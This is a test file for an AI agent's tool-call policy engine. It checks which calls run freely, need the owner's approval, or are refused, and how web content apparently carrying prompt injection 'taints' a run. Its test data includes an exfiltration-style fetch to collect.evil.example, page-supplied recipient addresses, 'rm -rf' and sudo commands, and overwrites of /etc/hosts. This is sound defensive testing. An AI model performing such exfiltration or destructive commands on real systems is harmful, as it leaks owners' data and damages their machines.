/**
 * S2-02: one gatekeeper for every tool call. These tests pin the order of the
 * checks and what each answer is, from both sides: what runs free, what asks,
 * what is refused, and what stops the run.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { decide } from "../src/policy/engine";
import { resetPolicyHooks, setPolicyHooks } from "../src/policy/hooks";
import { noopAuditSink, setAuditSink, type AuditEvent } from "../src/policy/audit-sink";
import { addTaint } from "../src/policy/context";
import type { Decision, PolicyInput, RunContext } from "../src/policy/types";
import { addApprovalRule, approvalTarget } from "../src/stores/approval-rules";
import { policyRig, type PolicyRig } from "./policy-fixture";

let rig: PolicyRig;
beforeEach(() => { rig = policyRig(); });
afterEach(() => { rig.close(); resetPolicyHooks(); setAuditSink(noopAuditSink); });

const call = (tool: string, args: Record<string, unknown> = {}, callID = "call_1"): PolicyInput => ({ tool, args, callID });
const act = (run: RunContext, tool: string, args: Record<string, unknown> = {}): Decision => decide(run, call(tool, args));
const tainted = (run: RunContext): RunContext => { addTaint(run, { kind: "web", label: "evil.example/page", tool: "web_fetch", at: "2026-11-16T10:00:00Z" }); return run; };

describe("free and gated, untainted (the owner's rule: ask about destructive things only)", () => {
  test("reversible work runs free", () => {
    const free: Array<[string, Record<string, unknown>]> = [
      ["rename_agent", { name: "Baahu" }],
      ["deep_research", { query: "grok bot" }],
      ["web_fetch", { url: "https://example.com" }],
      ["web_search", { query: "grok" }],
      ["memory_write", { text: "prefers short answers" }],
      ["remember_fact", { fact: "likes tea" }],
      ["link_save", { url: "https://example.com" }],
      ["task_create", { title: "file taxes" }],
      ["tasks_list", {}],
      ["read_file", { path: "/etc/hosts" }],
      ["grep", { pattern: "foo" }],
      ["mail_read", { uid: 1 }],
      ["mail_send", { account: "agent", to: ["a@b.c"], subject: "hi", body: "b" }],
      ["mail_send", { to: ["a@b.c"], subject: "hi", body: "b" }],
      ["bash", { command: "ls -la" }],
      ["write_file", { path: join(rig.scratch, "notes.md"), content: "hi" }],
      ["write_file", { path: "fresh.md", content: "lands under scratch" }],
      ["job_list", {}],
    ];
    for (const [tool, args] of free) {
      const decision = act(rig.run, tool, args);
      expect({ tool, action: decision.action, reason: decision.action === "refuse" ? decision.error : "" }).toEqual({ tool, action: "run", reason: "" });
    }
  });

  test("destructive work asks", () => {
    writeFileSync(join(rig.scratch, "keep.md"), "x");
    const gated: Array<[string, Record<string, unknown>]> = [
      ["bash", { command: "rm -rf /tmp/everything" }],
      ["bash", { command: "git status" }],
      ["mail_send", { account: "owner", to: ["a@b.c"], subject: "hi", body: "b" }],
      ["write_file", { path: "/etc/hosts", content: "127.0.0.1" }],
      ["write_file", { path: "../../apps/server/src/index.ts", content: "// clobber" }],
      ["write_file", { path: "keep.md", content: "changed" }],
      ["write_file", { path: "keep.md", content: "more", append: true }],
      ["run_privileged", { command: "sudo true", purpose: "test" }],
    ];
    for (const [tool, args] of gated) {
      expect({ tool, action: act(rig.run, tool, args).action }).toEqual({ tool, action: "ask" });
    }
  });

  test("a tool the engine has never heard of asks at tier 3, and a connector tool asks at tier 2", () => {
    rig.registry.register({ name: "brand_new_tool", description: "x", kind: "static", schema: { type: "object", properties: {} }, timeoutMs: 1000, handler: async () => ({}) });
    const run = rig.another({ capabilities: ["brand_new_tool", "mcp_notion_delete_everything"] });
    rig.registry.register({ name: "mcp_notion_delete_everything", description: "x", kind: "static", schema: { type: "object", properties: {} }, timeoutMs: 1000, handler: async () => ({}) });
    const unknown = act(run, "brand_new_tool");
    expect(unknown.action).toBe("ask");
    if (unknown.action === "ask") expect(unknown.card.tier).toBe(3);
    const connector = act(run, "mcp_notion_delete_everything");
    expect(connector.action).toBe("ask");
    if (connector.action === "ask") expect(connector.card.tier).toBe(2);
  });

  test("the card says what kind of harm: sends data out, or cannot be undone, or runs a command", () => {
    const risk = (tool: string, args: Record<string, unknown>) => {
      const decision = act(rig.run, tool, args);
      return decision.action === "ask" ? decision.card.risk : decision.action;
    };
    expect(risk("mail_send", { account: "owner", to: ["a@b.c"], subject: "s", body: "b" })).toBe("egress");
    expect(risk("write_file", { path: "/etc/hosts", content: "x" })).toBe("irreversible");
    expect(risk("bash", { command: "rm x" })).toBe("command");
  });
});

describe("the order of the checks", () => {
  test("a tool that is not on the bot's list is refused before anything else", () => {
    const run = rig.another({ capabilities: ["memory_search"] });
    const decision = act(run, "bash", { command: "ls" });
    expect(decision).toMatchObject({ action: "refuse", code: "not_available", error: "Tool is not available to this persona: bash" });
    expect(act(run, "no_such_tool")).toMatchObject({ action: "refuse", code: "not_available" });
  });

  test("a deferred tool the model has not loaded is refused with how to load it", () => {
    const run = rig.another({ isUnloaded: (tool) => tool === "web_search" });
    const decision = act(run, "web_search", { query: "x" });
    expect(decision).toMatchObject({ action: "refuse", code: "not_loaded" });
    if (decision.action === "refuse") expect(decision.error).toContain('load_tools');
  });

  test("a call that breaks the tool's schema is refused with an error that names the field, and raises no card", () => {
    const decision = act(rig.run, "write_file", { content: "x" });
    expect(decision).toMatchObject({ action: "refuse", code: "invalid_arguments", error: 'invalid arguments: "path" is required' });
    expect(act(rig.run, "bash", {})).toMatchObject({ action: "refuse", code: "invalid_arguments" });
  });

  test("a call that can be repaired is not refused (a numeric string where a number is wanted)", () => {
    expect(act(rig.run, "memory_search", { query: "x", limit: "5" }).action).toBe("run");
  });

  test("a routine's domain list refuses web_fetch to another domain and web_search with an empty list", () => {
    const run = rig.another({ allowedDomains: ["example.com"] });
    expect(act(run, "web_fetch", { url: "https://example.com/a" }).action).toBe("run");
    expect(act(run, "web_fetch", { url: "https://evil.example/a" })).toMatchObject({ action: "refuse", code: "domain_not_allowed", error: "domain is not allowed" });
    expect(act(rig.another({ allowedDomains: [] }), "web_search", { query: "x" })).toMatchObject({ action: "refuse", code: "domain_not_allowed" });
  });

  test("the pause switch stops the run before anything is judged", () => {
    setPolicyHooks({ isRunPaused: () => ({ scope: "all", message: "Stopped: you paused all bots." }) });
    expect(act(rig.run, "memory_search", { query: "x" })).toMatchObject({ action: "stop", cause: "pause" });
    expect(act(rig.run, "no_such_tool")).toMatchObject({ action: "stop", cause: "pause" });
  });

  test("no budget left stops the run, after the call is known to be well formed", () => {
    setPolicyHooks({ checkBudget: () => ({ ok: false, scope: "job", spentUSD: 0.5, capUSD: 0.5, message: "this task reached its limit" }) });
    expect(act(rig.run, "memory_search", { query: "x" })).toMatchObject({ action: "stop", cause: "budget" });
    expect(act(rig.run, "write_file", { content: "x" })).toMatchObject({ action: "refuse", code: "invalid_arguments" });
  });
});

describe("tainted runs (S2-03, S2-04, S2-05)", () => {
  test("D1: the agent's own mailbox is free in a clean run and asks in a tainted one", () => {
    const args = { account: "agent", to: ["a@b.c"], subject: "hi", body: "b" };
    expect(act(rig.run, "mail_send", args).action).toBe("run");
    const decision = act(tainted(rig.another()), "mail_send", args);
    expect(decision.action).toBe("ask");
    if (decision.action === "ask") {
      expect(decision.card.sources[0]?.label).toBe("evil.example/page");
      expect(decision.card.canRemember).toBe(false);
      expect(decision.card.tier).toBe(2);
      expect(decision.card.unnamedDestinations).toEqual(["a@b.c"]);
    }
  });

  test("an address the owner wrote is named; one the page supplied is not", () => {
    const run = tainted(rig.another({ ownerText: ["please send the summary to ann@example.com"] }));
    const named = act(run, "mail_send", { to: ["Ann@Example.com"], subject: "s", body: "b" });
    const unnamed = act(run, "mail_send", { to: ["ann@example.com", "boss@evil.example"], subject: "s", body: "b" });
    expect(named.action === "ask" && named.card.unnamedDestinations).toEqual([]);
    expect(unnamed.action === "ask" && unnamed.card.unnamedDestinations).toEqual(["boss@evil.example"]);
  });

  test("an address that only ends with a named one is not named", () => {
    const run = tainted(rig.another({ ownerText: ["write to ann@example.com"] }));
    const decision = act(run, "mail_send", { to: ["evilann@example.com", "xann@example.com"], subject: "s", body: "b" });
    expect(decision.action === "ask" && decision.card.unnamedDestinations).toEqual(["evilann@example.com", "xann@example.com"]);
  });

  test("web_fetch in a tainted run runs for the page the owner named and asks for anything else (F3)", () => {
    const run = tainted(rig.another({ ownerText: ["look at https://docs.example.org/guide for me"] }));
    expect(act(run, "web_fetch", { url: "https://docs.example.org/guide" }).action).toBe("run");
    // Another page, a query or a subdomain of the named host could carry what the run read: they ask.
    expect(act(run, "web_fetch", { url: "https://docs.example.org/page?q=1" }).action).toBe("ask");
    expect(act(run, "web_fetch", { url: "https://api.docs.example.org/x" }).action).toBe("ask");
    const other = act(run, "web_fetch", { url: "https://collect.evil.example/?d=secret" });
    expect(other.action).toBe("ask");
    if (other.action === "ask") expect(other.card.unnamedDestinations).toEqual(["https://collect.evil.example/?d=secret"]);
    // The same call in a clean run needs nothing.
    expect(act(rig.run, "web_fetch", { url: "https://collect.evil.example/?d=secret" }).action).toBe("run");
  });

  test("the owner's approved-destinations list counts as named", () => {
    // The table is migration 55's; its rows carry an updated_at.
    rig.db.run("INSERT INTO policy_settings (key, value, updated_at) VALUES ('approved_destinations', ?, ?)", [JSON.stringify(["*@corp.example", "partner.example"]), new Date().toISOString()]);
    const run = tainted(rig.another());
    const mail = act(run, "mail_send", { to: ["x@corp.example"], subject: "s", body: "b" });
    expect(mail.action === "ask" && mail.card.unnamedDestinations).toEqual([]);
    expect(act(run, "web_fetch", { url: "https://www.partner.example/a" }).action).toBe("run");
  });

  test("a tainted run may not change bots, schedules, routines or names", () => {
    const calls: Array<[string, Record<string, unknown>]> = [
      ["update_agent", { role: "x" }],
      ["create_agent", { name: "Evil", role: "r", prompt: "p" }],
      ["rename_agent", { name: "Evil" }],
      // A one-shot job is refused outright; a repeating one is put to the owner instead (s2-standing-jobs.test.ts).
      ["job_schedule", { text: "do it", at: "2030-01-01T09:00:00.000Z" }],
      ["job_cancel", { id: "job_1" }],
      ["routine_create", { name: "r", prompt: "p", cron: "0 9 * * *", timezone: "UTC" }],
      ["routine_pause", { id: "r", enabled: false }],
      ["routine_delete", { id: "r" }],
    ];
    for (const [tool, args] of calls) {
      const clean = act(rig.run, tool, args);
      expect({ tool, clean: clean.action === "refuse" && clean.code === "protected_write" }).toEqual({ tool, clean: false });
      const decision = act(tainted(rig.another()), tool, args);
      expect({ tool, code: decision.action === "refuse" ? decision.code : decision.action }).toEqual({ tool, code: "protected_write" });
    }
  });

  test("a tainted run may still write memory (it is stored as outside text, not refused)", () => {
    expect(act(tainted(rig.another()), "remember_fact", { fact: "x" }).action).toBe("run");
  });

  test("a tainted run's shell and file approvals work as before, with no 'always'", () => {
    const decision = act(tainted(rig.another()), "write_file", { path: "/etc/hosts", content: "x" });
    expect(decision.action === "ask" && decision.card.canRemember).toBe(false);
  });
});

describe("stored rules (S1-07 rules still work, but never against outside text)", () => {
  const sendArgs = { account: "owner", to: ["a@b.c"], subject: "hi", body: "b" };

  test("an 'always allow' rule lets the same send through in a clean run", () => {
    const target = approvalTarget("mail_send", sendArgs)!;
    const rule = addApprovalRule(rig.db, { agentID: rig.run.bot, toolName: "mail_send", target })!;
    const decision = act(rig.run, "mail_send", sendArgs);
    expect(decision).toMatchObject({ action: "run", via: "rule", ruleID: rule.id });
  });

  test("a rule for a send does not apply once the run has read outside text", () => {
    addApprovalRule(rig.db, { agentID: rig.run.bot, toolName: "mail_send", target: approvalTarget("mail_send", sendArgs)! });
    expect(act(tainted(rig.another()), "mail_send", sendArgs).action).toBe("ask");
  });

  test("a rule for another bot, or for another recipient, does not apply", () => {
    addApprovalRule(rig.db, { agentID: "someone-else", toolName: "mail_send", target: approvalTarget("mail_send", sendArgs)! });
    expect(act(rig.run, "mail_send", sendArgs).action).toBe("ask");
    addApprovalRule(rig.db, { agentID: rig.run.bot, toolName: "mail_send", target: approvalTarget("mail_send", { ...sendArgs, to: ["other@b.c"] })! });
    expect(act(rig.run, "mail_send", sendArgs).action).toBe("ask");
  });

  test("the card offers 'always allow' for a send in a clean run, and never for a shell command", () => {
    const send = act(rig.run, "mail_send", sendArgs);
    expect(send.action === "ask" && send.card.canRemember).toBe(true);
    const shell = act(rig.run, "bash", { command: "rm x" });
    expect(shell.action === "ask" && shell.card.canRemember).toBe(false);
  });
});

describe("the audit trail (fail closed)", () => {
  test("every decision is recorded with the tool, the answer and why", () => {
    const events: AuditEvent[] = [];
    setAuditSink({ record: (event) => { events.push(event); } });
    act(rig.run, "memory_search", { query: "x" });
    act(rig.run, "bash", { command: "rm x" });
    act(rig.run, "no_such_tool");
    expect(events.map((event) => [event.kind, event.detail.tool, event.detail.action])).toEqual([
      ["policy.decision", "memory_search", "run"],
      ["policy.decision", "bash", "ask"],
      ["policy.decision", "no_such_tool", "refuse"],
    ]);
    expect(events[1]!.actor).toBe(rig.run.bot);
    expect(typeof events[1]!.detail.reason).toBe("string");
  });

  test("when the audit trail cannot take the row, a call that would have run is refused instead", () => {
    setAuditSink({ record: () => { throw new Error("disk full"); } });
    expect(act(rig.run, "memory_search", { query: "x" })).toMatchObject({ action: "refuse", code: "audit_unavailable" });
    expect(act(rig.run, "bash", { command: "rm x" })).toMatchObject({ action: "refuse", code: "audit_unavailable" });
    // A call that was already refused stays refused for its own reason.
    expect(act(rig.run, "no_such_tool")).toMatchObject({ action: "refuse", code: "not_available" });
  });

  test("a dry run records nothing", () => {
    const events: AuditEvent[] = [];
    setAuditSink({ record: (event) => { events.push(event); } });
    decide(rig.run, call("memory_search", { query: "x" }), { record: false });
    expect(events).toEqual([]);
  });
});

describe("speed", () => {
  test("a decision takes well under a millisecond, with no model call", () => {
    const args = { query: "x" };
    for (let i = 0; i < 50; i += 1) act(rig.run, "memory_search", args);
    const started = performance.now();
    const rounds = 2_000;
    for (let i = 0; i < rounds; i += 1) act(rig.run, "memory_search", args);
    const each = (performance.now() - started) / rounds;
    expect(each).toBeLessThan(1);
  });
});
